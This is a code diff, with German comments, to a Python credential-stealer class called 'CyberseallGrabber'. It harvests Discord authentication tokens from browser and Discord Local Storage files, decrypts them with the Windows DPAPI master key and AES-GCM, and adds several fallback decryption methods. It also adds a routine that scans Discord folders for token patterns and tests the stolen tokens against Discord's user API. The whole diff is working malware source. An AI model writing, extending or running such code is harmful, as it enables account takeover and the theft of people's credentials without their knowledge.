@@ -43,8 +43,35 @@ class CyberseallGrabber:
         try:
             def decrypt(buff, master_key):
                 try:
-                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+                    # Methode 1: Standard AES-GCM
+                    decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                    cipher = AES.new(decrypted_key, AES.MODE_GCM, buff[3:15])
+                    decrypted = cipher.decrypt(buff[15:])[:-16].decode()
+                    return decrypted
                 except:
+                    try:
+                        # Methode 2: Direkter DPAPI
+                        result = win32crypt.CryptUnprotectData(buff, None, None, None, 0)
+                        if result and result[1]:
+                            return result[1].decode('utf-8', errors='ignore')
+                    except:
+                        pass
+                    
+                    try:
+                        # Methode 3: Verschiedene IV Positionen
+                        decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                        for iv_start in [3, 0, 12]:
+                            for iv_len in [12, 16, 8]:
+                                if len(buff) >= iv_start + iv_len + 16:
+                                    iv = buff[iv_start:iv_start + iv_len]
+                                    encrypted_data = buff[iv_start + iv_len:]
+                                    cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
+                                    decrypted = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
+                                    if len(decrypted) > 10:
+                                        return decrypted
+                    except:
+                        pass
+                    
                     return "Error"
             
             def getip():
@@ -118,6 +145,9 @@ class CyberseallGrabber:
                     if browser_name not in [p.split('-')[0] for p in paths.keys()]:
                         paths[browser_name] = base_path
             
+            # Sammle alle verfügbaren Schlüssel
+            encryption_keys = {}
+            
             for platform, path in paths.items():
                 if not os.path.exists(path):
                     continue
@@ -134,12 +164,10 @@ class CyberseallGrabber:
                         if os.path.exists(state_path):
                             with open(state_path, "r") as file:
                                 key = json.loads(file.read())['os_crypt']['encrypted_key']
+                                encryption_keys[platform] = key
                                 break
                     except: 
                         continue
-                
-                if not key:
-                    continue
                     
                 leveldb_path = os.path.join(path, "Local Storage", "leveldb")
                 if not os.path.exists(leveldb_path):
@@ -159,36 +187,64 @@ class CyberseallGrabber:
                                 r"mfa\.[\w-]{84}",
                                 r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
                                 r"[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}",
-                                r"mfa\.[A-Za-z0-9_-]{84}"
+                                r"mfa\.[A-Za-z0-9_-]{84}",
+                                # Neue Pattern für andere verschlüsselte Tokens
+                                r"djEw([A-Za-z0-9+/=]+)"
                             ]
                             
                             for pattern in patterns:
                                 matches = re.findall(pattern, content)
                                 for match in matches:
                                     if match and match not in tokens:
+                                        token_data = {
+                                            'token': match,
+                                            'platform': platform,
+                                            'key': key
+                                        }
                                         if pattern.startswith(r"dQw4w9WgXcQ"):
                                             # Für verschlüsselte Tokens
-                                            tokens.append("dQw4w9WgXcQ:" + match)
+                                            tokens.append(("dQw4w9WgXcQ:" + match, platform, key))
+                                        elif pattern.startswith(r"djEw"):
+                                            # Für djEw verschlüsselte Tokens
+                                            tokens.append(("djEw" + match, platform, key))
                                         else:
                                             # Für direkte Tokens
-                                            if not match.startswith("dQw4w9WgXcQ:"):
-                                                tokens.append("dQw4w9WgXcQ:" + match)
-                                            else:
-                                                tokens.append(match)
+                                            tokens.append((match, platform, key))
                     except PermissionError: 
                         continue
             
-            for token in tokens:
-                if token:
-                    # Bereinige Token
-                    clean_token = token.strip().replace("\\", "").replace("\n", "").replace("\r", "")
-                    if clean_token and clean_token not in cleaned and len(clean_token) > 10:
-                        cleaned.append(clean_token)
+            for token_data in tokens:
+                if token_data and len(token_data) == 3:
+                    token, platform, key = token_data
+                    if token:
+                        # Bereinige Token
+                        clean_token = token.strip().replace("\\", "").replace("\n", "").replace("\r", "")
+                        if clean_token and len(clean_token) > 10:
+                            cleaned.append((clean_token, platform, key))
             
-            for token in cleaned:
+            for token_data in cleaned:
                 try:
+                    if len(token_data) == 3:
+                        token, platform, key = token_data
+                    else:
+                        continue
+                        
                     if 'dQw4w9WgXcQ:' in token:
                         encrypted_part = token.split('dQw4w9WgXcQ:')[1]
+                        if encrypted_part and key:
+                            try:
+                                decoded_token = base64.b64decode(encrypted_part)
+                                master_key = base64.b64decode(key)[5:]
+                                tok = decrypt(decoded_token, master_key)
+                                if tok != "Error" and len(tok) > 20:
+                                    checker.append(tok)
+                            except:
+                                # Versuche direkten Token
+                                if len(encrypted_part) > 50 and '.' in encrypted_part:
+                                    checker.append(encrypted_part)
+                    elif token.startswith('djEw'):
+                        # djEw verschlüsselte Tokens
+                        encrypted_part = token[4:]  # Entferne 'djEw' Präfix
                         if encrypted_part and key:
                             try:
                                 decoded_token = base64.b64decode(encrypted_part)
@@ -218,8 +274,44 @@ class CyberseallGrabber:
                     except:
                         pass
             
-        except:
-            pass
+        except Exception as e:
+            # Einfache Fallback-Methode für Token-Suche
+            try:
+                fallback_tokens = []
+                
+                # Suche in Discord-Ordnern
+                discord_paths = [
+                    os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
+                    os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
+                    os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')
+                ]
+                
+                for path in discord_paths:
+                    if os.path.exists(path):
+                        for file in os.listdir(path):
+                            if file.endswith(('.ldb', '.log')):
+                                try:
+                                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                                        content = f.read()
+                                        # Suche nach aktuellen Token-Patterns
+                                        current_tokens = re.findall(r'[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}', content)
+                                        for token in current_tokens:
+                                            if token not in fallback_tokens and len(token) > 50:
+                                                fallback_tokens.append(token)
+                                except:
+                                    pass
+                
+                # Validiere Fallback-Tokens
+                for token in fallback_tokens[:5]:  # Nur die ersten 5 testen
+                    try:
+                        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
+                        if res.status_code == 200:
+                            self.t.append(token)
+                    except:
+                        pass
+            except:
+                pass
 
     def validate_tokens(self):
         valid_tokens = []
